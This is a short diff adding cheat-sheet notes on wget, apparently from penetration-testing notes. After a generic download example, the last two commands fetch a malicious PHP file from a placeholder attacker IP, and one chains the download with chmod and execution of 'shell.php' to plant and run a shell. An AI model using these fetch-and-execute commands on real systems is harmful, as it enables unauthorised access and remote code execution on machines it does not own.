@@ -1,1 +1,7 @@
+# Wget
+wget http://<ip>/file_name -O /path/to/save/file
 
+wget -O <filename> http://192.168.x.x/malicious-stuff.php
+
+you can also pipe in commands too such as:
+wget -O <filename> http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php
